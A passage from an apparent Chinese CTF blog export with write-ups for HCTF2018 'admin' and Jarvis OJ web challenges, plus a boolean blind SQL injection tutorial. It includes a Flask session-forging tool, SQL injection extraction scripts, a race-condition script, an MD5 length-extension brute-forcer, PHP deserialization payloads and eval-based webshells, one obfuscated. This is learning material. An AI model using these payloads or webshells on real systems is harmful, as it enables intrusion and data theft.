Exception('Must be using at least Python 3')elif sys.version_info[0] == 3 and sys.version_info[1] &lt; 4: # &gt;= 3.0 &amp;&amp; &lt; 3.4 from abc import ABCMeta, abstractmethodelse: # &gt; 3.4 from abc import ABC, abstractmethod# Lib for argument parsingimport argparse# external Importsfrom flask.sessions import SecureCookieSessionInterfaceclass MockApp(object): def __init__(self, secret_key): self.secret_key = secret_keyif sys.version_info[0] == 3 and sys.version_info[1] &lt; 4: # &gt;= 3.0 &amp;&amp; &lt; 3.4 class FSCM(metaclass=ABCMeta): def encode(secret_key, session_cookie_structure): """ Encode a Flask session cookie """ try: app = MockApp(secret_key) session_cookie_structure = dict(ast.literal_eval(session_cookie_structure)) si = SecureCookieSessionInterface() s = si.get_signing_serializer(app) return s.dumps(session_cookie_structure) except Exception as e: return "[Encoding error] &#123;&#125;".format(e) raise e def decode(session_cookie_value, secret_key=None): """ Decode a Flask cookie """ try: if(secret_key==None): compressed = False payload = session_cookie_value if payload.startswith('.'): compressed = True payload = payload[1:] data = payload.split(".")[0] data = base64_decode(data) if compressed: data = zlib.decompress(data) return data else: app = MockApp(secret_key) si = SecureCookieSessionInterface() s = si.get_signing_serializer(app) return s.loads(session_cookie_value) except Exception as e: return "[Decoding error] &#123;&#125;".format(e) raise eelse: # &gt; 3.4 class FSCM(ABC): def encode(secret_key, session_cookie_structure): """ Encode a Flask session cookie """ try: app = MockApp(secret_key) session_cookie_structure = dict(ast.literal_eval(session_cookie_structure)) si = SecureCookieSessionInterface() s = si.get_signing_serializer(app) return s.dumps(session_cookie_structure) except Exception as e: return "[Encoding error] &#123;&#125;".format(e) raise e def decode(session_cookie_value, secret_key=None): """ Decode a Flask cookie """ try: if(secret_key==None): compressed = False payload = session_cookie_value if payload.startswith('.'): compressed = True payload = payload[1:] data = payload.split(".")[0] data = base64_decode(data) if compressed: data = zlib.decompress(data) return data else: app = MockApp(secret_key) si = SecureCookieSessionInterface() s = si.get_signing_serializer(app) return s.loads(session_cookie_value) except Exception as e: return "[Decoding error] &#123;&#125;".format(e) raise eif __name__ == "__main__": # Args are only relevant for __main__ usage ## Description for help parser = argparse.ArgumentParser( description='Flask Session Cookie Decoder/Encoder', epilog="Author : Wilson Sumanang, Alexandre ZANNI") ## prepare sub commands subparsers = parser.add_subparsers(help='sub-command help', dest='subcommand') ## create the parser for the encode command parser_encode = subparsers.add_parser('encode', help='encode') parser_encode.add_argument('-s', '--secret-key', metavar='&lt;string&gt;', help='Secret key', required=True) parser_encode.add_argument('-t', '--cookie-structure', metavar='&lt;string&gt;', help='Session cookie structure', required=True) ## create the parser for the decode command parser_decode = subparsers.add_parser('decode', help='decode') parser_decode.add_argument('-s', '--secret-key', metavar='&lt;string&gt;', help='Secret key', required=False) parser_decode.add_argument('-c', '--cookie-value', metavar='&lt;string&gt;', help='Session cookie value', required=True) ## get args args = parser.parse_args() ## find the option chosen if(args.subcommand == 'encode'): if(args.secret_key is not None and args.cookie_structure is not None): print(FSCM.encode(args.secret_key, args.cookie_structure)) elif(args.subcommand == 'decode'): if(args.secret_key is not None and args.cookie_value is not None): print(FSCM.decode(args.cookie_value,args.secret_key)) elif(args.cookie_value is not None): print(FSCM.decode(args.cookie_value)) 脚本有解密、加密两种功能，具体用法如下解密:python flask_session_manager.py decode -c -s # -c是flask cookie里的session值 -s参数是SECRET_KEY加密:python flask_session_manager.py encode -s -t # -s参数是SECRET_KEY -t参数是session的参照格式，也就是session解密后的格式 解密功能演示如下，把我们登录成功页面的cookie的session复制下来,.eJw9kE-LwjAUxL_K8s4e0j_iInjYJVoqvISWtJJciltrmzRxoSp1K373zbrgbWDe-zEzd6iOQ3PuYHkZrs0MKn2A5R3evmAJiuZOmvWIorPosoiJUiMtezmlN2aYlVNBGE3nXKQToxlhpiAqKX7QbA2ag5GiM5y2AROSYIgB2xU3KbJIOtVh8qeLkdE6lqKeM7HVuFvHXFj_s_b83Miw1Mp01t8RpG0kd9nE6UZzWoQYMp9l2ythnRTpCh4zqM_Dsbp8983pVYFTjDHMPQZHaTZGJcrrT4eiHeXUEjS9r9WHPCktTm3g40bsY_XEabdvmxcpNxgfxn_ntHfeAKeHfW2bxeIdZnA9N8NzPAgIPH4BSzZuKg.XPPM0g.R-SQaZ-c92TXQB_37gFu8JabVUs，然后放进脚本参数位置，如下图。 得到解密后的session格式如下{&#39;_fresh&#39;: True, &#39;_id&#39;: b&#39;d4fb1018e2d755b05dc2163ec54429923444654de222c27ca8c8855643c55e1a47bfa0e1a50478a7952b1a899c81164ccebf8ea54087ad381b8563cb02de9fa2&#39;, &#39;csrf_token&#39;: b&#39;8383dbf30b1cdfbf0f180c842975968ee3858874&#39;, &#39;image&#39;: b&#39;F38w&#39;, &#39;name&#39;: &#39;miracle778&#39;, &#39;user_id&#39;: &#39;10&#39;} 把其中的name项的值改为admin后，再作为-t的参数进行session加密，如下图 得到签名后的admin session.eJw9kE-LwjAQxb_KMmcP6R8vgoddoqXCJLSkleQiamubaeNCVepW_O6bdcHbgzfz4733gN1pqC8tLK7DrZ7BzlaweMDHARZgeO40rUZUbY8ui4QqLfKy01N6FyR6PRVM8HQuVToJnjFBBTNJ8YO0IaSKtGpJ8iYQSjMMMRDb4q5VFmlnWkz-dDEKfoy1Os6F2ljcrmKpev-z8vycdFhaQ23v7xjyJtLbbJJ8bSUvQgyFz7LpjOqdVukSnjM4XobT7vrd1ed3BckxxjD3GBw1rckkxusvh6oZ9dQwpM7X6kKZlD1OTeDjRuJz-cJZt2_qNyknjKvx3znvnTdgXzl7hhncLvXw2g0CBs9fJX1ssA.XPPSPQ.UZ-MG3ZUrN4nJzOXIsfjGdeiyLc 用这个替换掉index页面的cookie值，即可成功伪造session，”变成admin”，得到flag 关于这个脚本，其实在运行的时候，我发现了点问题，就是当你解密的时候，要用到 -s -c两个参数，linux下，可以用&#39;或&quot;包围，而windows下只能用&quot;，否则会报错。然后加密的话，windows能够生成加密后的session，但是用它来替换掉index页面的session的话不起作用(亲测)，一开始我在windows下面试的，结果一致出不来flag，后面突然想到用linux试一下，才发现这个问题(2333)。然后每次加密生成的session是不一样的，猜测应该是里面加入了时间戳信息。 然后其实加密的时候 -t参数没必要写这么长，我们可以看到index.html里代码是，只要session[&#39;name&#39;]==admin即可，所以我们可以用python flask_session_manager.py encode -s &#39;ckj123&#39; -t &quot;{&#39;name&#39;:&#39;admin&#39;,&#39;user_id&#39;:&#39;10&#39;}&quot;生成session，eyJfZnJlc2giOmZhbHNlLCJuYW1lIjoiYWRtaW4iLCJ1c2VyX2lkIjoiMTAifQ.XPPVVw.PEoVwVpFka6CBxToJEUY2s7ydLE也能得到flag。 解法二 —— Unicode欺骗这个解法好像才是这个题目想要考查的点，我们可以发现，不管是login、register还是change页面，只要是关于session[‘name’]的操作，都先用了strlower函数将name转成小写，但是python中有自带的转小写函数lower，这里重写了一个，可能有点猫腻，于是找到strlower函数的定义123def strlower(username): username = nodeprep.prepare(username) return username 这里用到了nodeprep.prepare函数，而nodeprep是从twisted模块中导入的from twisted.words.protocols.jabber.xmpp_stringprep import nodeprep，在requirements.txt文件中，发现这里用到的twisted版本是Twisted==10.2.0，而官网最新版本为19.2.0(2019/6/2)，版本差距这么大，估计是存在什么漏洞，于是搜索一下nodeprep.prepare，找到一篇unicode安全的文章，https://paper.tuisec.win/detail/a9ad1440249d95b 这里原理就是利用nodeprep.prepare函数会将unicode字符ᴬ转换成A，而A在调用一次nodeprep.prepare函数会把A转换成a。所以当我们用ᴬdmin注册的话，后台代码调用一次nodeprep.prepare函数，把用户名转换成Admin，我们用ᴬdmin进行登录，可以看到index页面的username变成了Admin，证实了我们的猜想，接下来我们就想办法让服务器再调用一次nodeprep.prepare函数即可。我们发现在改密码函数代码里，也用到了nodeprep.prepare函数，也就是说，我们在这里改密码的话，先会把username改为admin，从而改掉admin的密码。 然后用admin和改的密码的登录，即可获取flag。 解法三 —— 条件竞争仔细观察源码，可以发现login函数和change函数都在没有完全check身份的情况下，执行了session有关的赋值 我们可以这样设想，一个进程以正常账号一直依次进行登录、改密码操作，另一个进程同时一直依次进行注销、以admin用户名加进程1更改的新密码进行登录。就有可能出现当进程1进行到改密码函数时，进程2进行到登录操作，这个时候进程1需要从session中取出name，而进程2此时把session[‘name’]改成了admin。 所以就可以编写脚本进行条件竞争，条件竞争结束的标志为进程2登录操作成功，即重定向到/index。 不过没有跑出来，可能是买的学生机性能不行，脚本跑的时候抛出拒绝连接、连接失败等异常。没跑出来，但是思路应该是正确的。下面就把代码贴下吧，这个代码也是参考来了，就那几步，可能代码也不行，导致没跑出来。12345678910111213141516171819202122232425262728293031323334353637383940414243444546import threadingimport requestsimport timedef login(s,username,password): data = &#123; 'username':username, 'password':password, 'submit':'' &#125; r = s.post('http://13x.xx7.xx.xxx:9999/login',data=data) return rdef logout(s): s.get('http://13x.xx7.xx.xxx:9999/logout')def change_pwd(s,newpass): data = &#123; 'newpassword':newpass &#125; s.post('http://13x.xx7.xx.xxx:9999/change',data=data)def func1(s): try: login(s,'Miracle778','Miracle778') change_pwd(s,'Miracle778') except Exception: passdef func2(s): try: logout(s) r = login(s,'admin','Miracle778') if '&lt;a href="/index"&gt;/index&lt;/a&gt;' in r.text: print(r.text) exit(0) except Exception: passfor i in range(10000): print(i) s = requests.Session() t1 = threading.Thread(target=func1,args=(s,)) t2 = threading.Thread(target=func2,args=(s,)) t2.start() t1.start() 小结这道题三种解法，学到东西挺多的，以后要多多复现经典题目2333~ 参考https://www.anquanke.com/post/id/164086#h3-13]]></content>
      <categories>
        <category>CTF</category>
        <category>HCTF2018</category>
      </categories>
      <tags>
        <tag>HCTF2018</tag>
        <tag>CTF复现</tag>
        <tag>flask session伪造</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQL注入之布尔盲注]]></title>
    <url>%2FWeb%E5%AE%89%E5%85%A8%2FSQL%E6%B3%A8%E5%85%A5%2FSQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8.html</url>
    <content type="text"><![CDATA[之前看sqli-labs的时候，有些东西没有仔细研究，现在折回来细学一下。先从布尔盲注开始，后面还会继续更新。 前言简单写了写python脚本，写了get型的，也写了post型。get型的脚本主要是以sqli-labs的less-5、6做例子，post型的是用Jarvis Oj上的simple injection一题为例。想用二分法猜表名、列名但最后没用，直接用的枚举，因为觉得直接枚举的速度日常做做题够用了(233) 原理什么叫盲注，说白了就是在sql注入过程中，sql语句的执行结果不回显到前端，这个时候就只能用一些别的方法进行判断或者尝试，这个判断或尝试过程就叫盲注。盲注又可以分为：1、基于布尔SQL盲注 2、基于时间的盲注 3、基于报错的盲注 我今天这里写的是基于布尔的SQL盲注。 例子GET型这里选的是sqli-labs的less-5做讲解。 既然是布尔盲注，那页面回显结果肯定要能被判别成True和False。比如这里的less-5，当我们访问http://127.0.0.1:9000/sqli-labs-master/Less-5/?id=1，页面返回You are in...，而当我们访问http://127.0.0.1:9000/sqli-labs-master/Less-5/?id=1&#39;，页面返回sql语句报错信息，没有You are in...。 这里就可以把页面有You are in...视为True，没有视为False。然后我们就能以这个为标准去进行判断枚举。比如我们想要猜测数据库的长度，判断它是不是大于7，我们就可以访问http://127.0.0.1:9000/sqli-labs-master/Less-5/?id=1&#39; and length(database())&gt;7 %23，结果页面返回You are in...，说明结果为True，就是说数据库长度大于7，于是我们就能进行进一步猜测，通过枚举或者夹逼的方法，最终确定数据库长度。猜解数据库名的话，就用substr函数，例如http://127.0.0.1:9000/sqli-labs-master/Less-5/?id=1&#39; and substr(database(),1,1)&gt;&#39;r&#39; %23，这是判断数据库首位是否大于&#39;r&#39;，根据结果可进一步推测并最终确定，方法也是枚举或者夹逼。 POST型这里选用Jarvis Oj的simple injection题。http://web.jarvisoj.com:32787/login.php这题经过测试，发现当页面回显密码错误时，逻辑为True，当页面回显用户名错误时，逻辑为False。然后过滤了空格，可用/**/替代。找到这个布尔判断逻辑后，接下来的操作跟上面GET型讲的就差不多了。 测试完后，就可以用写脚本，让python帮我们去猜了。 脚本编写思路python3 布尔盲注编写思路先手工测试，找到用来判断True、False的标志，再看看存不存在过滤。手工测试完了后，就按下面流程来写代码，先用length函数获取要猜的对象的长度，然后根据这个长度利用substr函数逐位猜解。主要分两个函数 爆长度函数get_length(url,obj) 猜表长度、列长度obj参数举例: obj = “database()” obj = “select group_concat(table_name) from information_schema.tables where table_schema=database()” 爆名字函数get_name(url,obj) obj语句里用group_concat，全猜了，而不用limit 贴脚本GET型——sqli-labs Less-5123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657'''@Author: Miracle778@Date: 2019-05-24 21:31:41@LastEditors: Miracle778@LastEditTime: 2019-05-25 12:44:58@Description: 盲注脚本GET型'''import requestsimport stringclass GetInject: # mysql不区分大小写，一般表名、列名都是由字母组成的比较多，所以把字母集放前面，先枚举 chr_str = string.ascii_lowercase + string.punctuation + string.digits def __init__(self,url,mark,obj): ''' obj参数举例: obj = "database()" obj = "select table_name from information_schema.tables where table_schema=database() limit 0,1" ''' self.url = url self.mark = mark self.obj = obj def get_length(self): payload_len = "' and length(&#123;0&#125;)=&#123;1&#125; --+" #如果实例参数是双引号型或者整数型，记得把改payload格式 i = 1 while True: payload_len_i = payload_len.format(self.obj,i) r = requests.get(self.url+payload_len_i) if self.mark in r.text: print("len",i) return i i += 1 def get_name(self): name_len = self.get_length() payload_name = "' and substr(&#123;0&#125;,&#123;1&#125;,1)='&#123;2&#125;' --+" output = '' for i in range(1,name_len + 1): for c in self.chr_str: # 直接枚举 payload_name_i = payload_name.format(self.obj,i,c) r = requests.get(url+payload_name_i) if self.mark in r.text: output += c print(output) break return output# mark 是判断为True还是False的标志，这里是you are inurl = "http://127.0.0.1:9000/sqli-labs-master/Less-5/?id=1"mark = "You are in"obj_t = "(select group_concat(table_name) from information_schema.tables where table_schema=database())"obj_c = "(select group_concat(column_name) from information_schema.columns where table_schema=database())"test1 = GetInject(url,mark,obj_t)test1.get_name() 图中代码测试了一下爆表名，执行结果如下图。 如果用这个脚本跑别的实例的话，稍微改下url、mark、payload就好了。相关注释也都写在代码中了。 POST型——Jarvis OJ simple Injection''' @Author: Miracle778 @Date: 2019-05-25 12:45:17 @LastEditors: Miracle778 @LastEditTime: 2019-05-25 14:00:13 @Description: Jarvis Oj simple injection post型盲注，过滤了空格 ''' import requests import string def get_length(url,obj): payload_len = "admin' and length({0})={1}#".replace(' ','/**/') i = 1 while True: payload_len_i = payload_len.format(obj,i) param['username'] = payload_len_i r = requests.post(url,data=param) if mark not in r.text: print("len:",i) return i i += 1 def get_name(url,obj): payload_name = "admin' and substr({0},{1},1)='{2}'#".replace(' ','/**/') name_len = get_length(url,obj) chr_str = string.ascii_lowercase + string.digits + string.punctuation output = '' for i in range(1,name_len+1): for c in chr_str: payload_name_i = payload_name.format(obj,i,c) param['username'] = payload_name_i r = requests.post(url,data=param) if mark not in r.text: output += c # print(output) break return output url = "http://web.jarvisoj.com:32787/login.php" param = {"password":"123"} mark = "用户名错误" obj_t = "(select group_concat(table_name) from information_schema.tables where table_schema=database())".replace(' ','/**/') obj_c = "(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='{0}')".replace(' ','/**/') obj_v = "(select group_concat({0}) from {1})".replace(' ','/**/') table_name = get_name(url,obj_t).split(',') for i in table_name: print("table:",i) obj_c_i = obj_c.format(i) column_name = get_name(url,obj_c_i).split(',') print("column:",column_name) for j in column_name: obj_v_i = obj_v.format(j,i) value = get_name(url,obj_v_i).split(',') print("{0}.{1}:{2}".format(i,j,value)) 整体代码结构跟GET型差不多，就是把请求类型改成了post，然后用/**/代替空格。执行结果如下图。 小结代码写的确实有点辣鸡，将就看吧。。。。]]></content>
      <categories>
        <category>Web安全</category>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>布尔盲注</tag>
        <tag>python脚本</tag>
        <tag>sqli-labs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Jarvis OJ Web]]></title>
    <url>%2FCTF%2FJarvis%2FWeb%2FJarvis-OJ-Web.html</url>
    <content type="text"><![CDATA[Jarvis OJ Web部分题目的write up 前言前后零零碎碎算是把Jarvis OJ上面Web部分的题刷完了，收获挺多的，特此记录一下。Jarvis Oj题目地址：https://www.jarvisoj.com/challenges 0x01 PORT51题目描述: 题目链接：http://web.jarvisoj.com:32770/ 题目链接进去如下图，说要用51端口进行访问。 看到题目我的第一反应是用socket编程。后面发现不用这么麻烦，直接用curl --local-port即可。 0x02 LOCALHOST题目描述: 题目链接：http://web.jarvisoj.com:32770/ 题目链接点进去提示说，localhost access only!! 这类题目也见过挺多了，直接改请求头里的X-Forwarded-For即可。 0x03 Login题目描述: 需要密码才能获得flag哦。题目链接：http://web.jarvisoj.com:32772/ 题目进去是一个输入框，随便输点东西试试，并没有发现什么有用的东西，于是找找源码和请求头、响应头里有没有什么提示。然后再请求头里找到Hint “select * from &#96;admin&#96; where password=’”.md5($pass,true).”‘“ 这里就是利用md5函数的不同输出形式。具体可参照:https://blog.csdn.net/March97/article/details/81222922 这里就不多讲了。 只要输入特定的字符串，如可以输入ffifdyop和129581926211651571912466741651878684928即可得到flag 0x04 神盾局的秘密题目描述: 这里有个通向神盾局内部网络的秘密入口，你能通过漏洞发现神盾局的秘密吗？题目入口：http://web.jarvisoj.com:32768/ 点进链接去是一张图片，仔细看了一遍这张图，发现并没有什么异常。于是开始在源码和请求头里找看有没有提示。 然后在index.php的源码里发现了图片插入的标签&lt;img src=showimg.php?img=c2hpZWxkLmpwZw==&gt; 这个showimg.php和img参数不免让人想到文件包含，把img参数的值base64解密一下，发现是shield.jpg。于是就可以确定思路，利用showimg.php显示一下index.php看看能不能得到什么信息。 于是访问:http://web.jarvisoj.com:32768/showimg.php?img=aW5kZXgucGhw，aW5kZXgucGhw是index.php的base64加密编码得到下图结果。 这里的代码应该是index.php的源码，一部分在注释里，另一部分放在了html里，这里整理一下。123456789&lt;?php require_once('shield.php');$x = new Shield();isset($_GET['class']) &amp;&amp; $g = $_GET['class'];if (!empty($g)) &#123; $x = unserialize($g);&#125;echo $x-&gt;readfile();?&gt; 这代码看过去，看到shield.php和unserialize就应该明白过来，应该是要用反序列化，shield类的代码在shield.php里面，于是继续用showimg.php显示一下shield.php。访问:http://web.jarvisoj.com:32768/showimg.php?img=c2hpZWxkLnBocA==，img参数值是shield.php的base64编码。 得到下图结果。又是一部分代码注释另一部分放在HTML里。再次整理一下shield.php代码12345678910111213141516&lt;?php//flag is in pctf.phpclass Shield &#123; public $file; function __construct($filename = '') &#123; $this -&gt;file = $filename; &#125; function readfile() &#123; if (!empty($this-&gt;file) &amp;&amp; stripos($this-&gt;file,'..')===FALSE &amp;&amp; stripos($this-&gt;file,'/')===FALSE &amp;&amp; stripos($this-&gt;file,'\\'==FALSE) &#123; return @file_get_contents($this-&gt;file); &#125; &#125;&#125;?&gt; 这段代码里可以看到提示说flag在pctf.php里面，而前面index.php里最后调用的readfile函数具体实现代码也在这里。到这里就很明显了。构造数据，使得反序列化后shield的file参数为pctf.php，然后利用readfile函数输出flag。生成payload。 最终payload为:http://web.jarvisoj.com:32768/index.php?class=O:6:%22Shield%22:1:{s:4:%22file%22;s:8:%22pctf.php%22;} 得到flag 0x05 IN A Mess题目描述: 连出题人自己都忘了flag放哪了，只记得好像很混乱的样子。题目入口：http://web.jarvisoj.com:32780/ 这个题，前几天写SQL注入Bypass的时候写过了，这里就不多讲了。http://miracle778.site/Web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BWAF-Bypass.html#more 0x06 RE?题目描述: 咦，奇怪，说好的WEB题呢，怎么成逆向了？不过里面有个help_me函数挺有意思的哦附件链接:https://dn.jarvisoj.com/challengefiles/udf.so.02f8981200697e5eeb661e64797fc172 这题应该是考知识广度吧，mysql扩展函数 —- UDF 有时候我们需要对表中的数据进行一些处理而内置函数不能满足需要的时候，就需要对MySQL进行一些扩展，使用者自行添加的MySQL函数就称为UDF(User Define Function)。 于是只要在mysql上导入，然后调用里面函数。这里附件文件头是EIF开头，所以要在linux下的mysql使用。 先在mysql命令行下用select @@plugin_dir查看mysql的插件目录然后把udf.so文件拷贝到该目录下并重命名为udf.so。然后在mysql里使用create function &lt;函数名&gt; returns string soname &lt;udf文件名&gt;创建外部函数。如这里，题目描述里面说到有个help_me函数挺有意思，于是使用create function help_me returns string soname &#39;udf.so&#39;;创建help_me函数，然后使用select help_me();调用该函数。 上图是调用了help_me函数的结果，提示说用getflag函数获取flag，于是再执行一次create function getflag returns string soname &#39;udf.so&#39;语句，然后调用一次。 0x07 flag在管理员手里题目描述: 只有管理员才能获得flag，你能想办法获得吗？题目链接：http://web.jarvisoj.com:32778/ 题目进去又是说只有admin能看flag，随便试一下改X-Forwarded-For 127.0.0.1，果不其然失败了。 不过在请求头发现了cookie的值有点东西… 这里把role的值url解码后，是s:5:&quot;guest&quot;;，是guest序列化的结果。发现这个之后，肯定先把guest改一下admin试一下看看能不能成功，结果当然是失败了，因为cookie里还有另一个变量hsh，它的值是一串哈希字符串，估计是用来校验的。只改role肯定是不行，肯定要改对应的hsh。 但改hsh肯定要知道他是怎么加密的，不然凭空爆破肯定是不行的。于是要找找看有没有源代码。于是用御剑扫扫后台，并没有发现什么东西，于是就只能再扫扫看有没有备份文件或者临时文件，尝试几个.bak、.save、.swp、~，发现index.php~可以访问并下载的。index.php~下载下来分析，发现实质是个.swpvim异常退出文件，于是改个名用vim恢复一下。最终源码如下12345678910111213141516171819202122232425262728293031323334353637383940&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;Web 350&lt;/title&gt;&lt;style type="text/css"&gt; body &#123; background:gray; text-align:center; &#125;&lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;?php $auth = false; $role = "guest"; $salt = if (isset($_COOKIE["role"])) &#123; $role = unserialize($_COOKIE["role"]); $hsh = $_COOKIE["hsh"]; if ($role==="admin" &amp;&amp; $hsh === md5($salt.strrev($_COOKIE["role"]))) &#123; $auth = true; &#125; else &#123; $auth = false; &#125; &#125; else &#123; $s = serialize($role); setcookie('role',$s); $hsh = md5($salt.strrev($s)); setcookie('hsh',$hsh); &#125; if ($auth) &#123; echo "&lt;h3&gt;Welcome Admin. Your flag is &#125; else &#123; echo "&lt;h3&gt;Only Admin can see the flag!!&lt;/h3&gt;"; &#125; ?&gt; &lt;/body&gt;&lt;/html&gt; 看一下代码，可以发现，role要反序列化得到admin，hsh要为(salt + role的反置)的md5值。查了一下资料，发现hsh那部分可以利用md5扩展攻击实现，但是要实现md5扩展攻击，对role肯定是要特殊构造的，而改了role的话，$role ==== admin又是三个=不能用弱类型比较。于是想到可能要利用unserialize函数。于是对unserialize函数简单测试了一下。如上图示，我们可以发现，当s:5:&quot;guest&quot;;被反序列化后，后面接着的内容被忽视掉了。(PS:后面用php7测试了一下，结果一样) 下面是关于md5哈希长度扩展攻击的资料，这里就不多写了。https://www.cnblogs.com/p00mj/p/6288337.htmlhttps://www.cnblogs.com/pcat/p/5478509.html 看完上面两个链接里的资料后，应该对md5哈希长度扩展攻击即相关工具hashpump有了了解。按道理就应该直接用hashpump生成hsh，然后填入cookie就好。但是哈希长度扩展攻击有一个前提条件，可以不知道salt的值，但是要知道它的长度，这样才能进行填充。 因此这里还要用到python，对salt的长度进行一下爆破，然后用python进行提交，python代码如下。123456789101112131415161718192021222324252627282930313233343536373839import requestsimport urllibimport osurl = "http://web.jarvisoj.com:32778/"# 提交请求def Post(role,hsh,i): cookie = &#123;'role':role,'hsh':hsh&#125; r = requests.get(url,cookies=cookie) # 如果提交的是错误的hsh值得话，错误返回报文长度为210 if len(r.text) != 210: print("第",i,'次') print(r.text) exit() return# 计算hash值cmd = 'hashpump -s 3a4727d57463f122833d9e732f94e4e0 -d \';"tseug":5:s\' -k &#123;&#125; -a \';"nimda":5:s\''# 开始爆破for i in range(1,100): cmd_ = cmd.format(str(i)) res = os.popen(cmd_).readlines() hsh,role = res[0][:-1],res[1][:-1] # 需要对role进行反置处理 t1,t2,t3 = role[:12],role[12:-12],role[-12:] t2 = t2.split('\\x') t2 = t2[::-1] t2 = '%'.join(t2) t2 = '%' + t2[:-1] role = t3[::-1] + t2 + t1[::-1] role = role.replace(';','%3b') print("第",i,'次') print(role) Post(role,hsh,i) 代码跑一下，得到结果，salt的长度是12。 0x08 Chopper题目描述: 小明入侵了一台web服务器并上传了一句话木马，但是，管理员修补了漏洞，更改了权限。更重要的是：他忘记了木马的密码！你能帮助他夺回控制权限吗？关卡入口：http://web.jarvisoj.com:32782/题目来源:ISCC2016 题目链接点进去如下图，点击下面的管理员登录，链接指向http://web.jarvisoj.com:32782/admin，弹了一个框说you are not admin!,然后页面是403 Forbidden You don&#39;t have permission to access /admin/ on this server. 查看admin页面的源码，如下图，发现有行注释，里面有admin的ip。 于是访问这个ip，也是403禁止访问。这条路到这也算断了。 于是返回主页，看看有没有别的消息。发现index.php页面那张图片的img标签导入链接有点蹊跷。 发现图片地址是用proxy.php的url参数导入的。于是想到是不是要用proxy.php来打ssrf。后面发现就是用proxy.php做两个跳转而已。 于是访问http://web.jarvisoj.com:32782/proxy.php?url=http://202.5.19.128/然后发现页面url被重定向为http://web.jarvisoj.com:32782/index.php?url=http://8080av.com，由此可以确定可以通过proxy.php访问202.5.19.128。 但是通过proxy.php访问202.5.19.128/admin的话，会访问失败。 于是可以试试访问202.5.19.128/proxy.php看看是不是存在，是不是需要跳转两次。结果发现可以访问 到现在可以简单理下思路 http://web.jarvisoj.com:32782/ 下有proxy.php可以跳转访问还有/admin/目录 403 禁止访问http://202.5.19.128/ 下有proxy.php可以进行跳转可以推测 flag在 http://web.jarvisoj.com:32782/admin/ 目录下而用 http://web.jarvisoj.com:32782/proxy.php?url=http://web.jarvisoj.com:32782/admin/ 与直接访问 http://web.jarvisoj.com:32782/admin/ 得到的结果一样，都是弹框 you are not admin 所以推测是要用 http://web.jarvisoj.com:32782/proxy.php 跳 http://202.5.19.128/proxy.php 跳 http://web.jarvisoj.com:32782/admin/ 进行两次跳转。 payload:http://web.jarvisoj.com:32782/proxy.php?url=http://202.5.19.128/proxy.php?url=http://web.jarvisoj.com:32782/admin/跳转结果如下图，you are cloosing 说实话，到这里又懵了，后面看完别人的wp，发现admin/ 目录下还有robots.txt这个文件，于是访问robots.txt文件，内容如下123User-agent: *Disallow:trojan.phpDisallow:trojan.php.txt 于是继续访问trojan.php.txt,看一下代码先。1&lt;?php $&#123;("#"^"|").("#"^"|")&#125;=("!"^"`").("( "^"&#123;").("("^"[").("~"^";").("|"^".").("*"^"~");$&#123;("#"^"|").("#"^"|")&#125;(("-"^"H"). ("]"^"+"). ("["^":"). (","^"@"). ("&#125;"^"U"). ("e"^"A"). ("("^"w").("j"^":"). ("i"^"&amp;"). ("#"^"p"). ("&gt;"^"j"). ("!"^"z"). ("T"^"g"). ("e"^"S"). ("_"^"o"). ("?"^"b"). ("]"^"t"));?&gt; 被混淆了，不过没关系，复制下来本地执行一下，看看报错信息。所以这应该是题目描述里小明的一句话木马。密码是360 知道这个之后，就简单了。 这道题感觉有点那么脑洞(可能是因为菜吧)，但是每一步又都有点有理有据。哎，菜逼还是菜呀。 0x09 Easy Gallery题目描述: “没有什么防护是一个漏洞解决不了的，如果有，那就…..“题目入口：http://web.jarvisoj.com:32785/ 题目进去是一个简单的网站系统。简单浏览测试下，发现总共有两个功能。 第一个功能是上传图片，经过简单测试，发现只能上传jpg和gif格式图片。而且用burp改后缀跟MIME都不可用，猜测是用了文件头校验。 第二个功能是view，通过前面上传图片成功会得到一个图片ID，可以通过输入图片ID和图片类型(jpg、gif)进行查看。 结合这两个功能的测试分析，不难推测，这题应该是通过生成图片马绕过上传得到图片ID，然后利用图片ID进行文件包含连接小马。那么现在最主要的问题就集中在如何得到上传图片的路径和找到进行文件包含的点。 找到上传图片的路径简单，先上传一个正常jpg图片，然后通过图片ID访问一下，测试一下整个流程。可以看到，成功访问。 在图片上右击 在新标签页打开，得到图片访问路径为http://web.jarvisoj.com:32785/uploads/&lt;图片ID&gt;.&lt;图片类型jpg/gif&gt; 下一个问题就是找到可以进行文件包含的点。通过观察不难发现，Submit和View功能页面的url都是通过?page=参数进行访问的。Submit功能的url为http://web.jarvisoj.com:32785/index.php?page=submitView功能的url为http://web.jarvisoj.com:32785/index.php?page=view 我们可以将page参数赋为图片路径，看看页面返回结果从返回的warning信息可以看出，服务器会自动把传入的page参数的值后面加上.php后缀，限制我们访问除php外的文件，但是这里可以用%00截断一下。我们把图片ID改成一个不存在的错误ID,然后用%00截断一下，如果截断成功，则应该会出现xxxx.jpg failed to open...报错。执行结果如图示，证明此处是可以用%00截断的。 于是我们生成一个图片马上传试试。copy shell.gif/b + 2.php/a 2.gif这里shell.gif是一张正常图片，2.php内容为&lt;?php @eval($_POST[&#39;miracle778&#39;]);?&gt; 生成好后，我们上传、截断包含一下，居然提示you should not do this!。 说明可能我们马可能被检测到了。然后没办法了，只能搜索一波别人的wp。 然后发现把一句话木马改为&lt;script language=&quot;php&quot;&gt;@eval_r($_POST[&#39;miracle778&#39;]);&lt;/script&gt;即可···另外提一下，&lt;script language=&quot;php&quot;&gt;这种写法好像php7已经不支持了。 重新生成图片马上传，截断包含即可得flag。 0x10 Simple Injection题目描述: 很简单的注入，大家试试？题目入口：http://web.jarvisoj.com:32787/题目来源：ISCC2016 题目进去是一个登录框。 简单测试下，发现有密码错误和用户名错误两种错误回显。当输入username=admin&amp;password=123，页面返回密码错误。 当输入username=admin&#39;&amp;password=123，页面返回用户名错误。 而输入username=admin&#39; 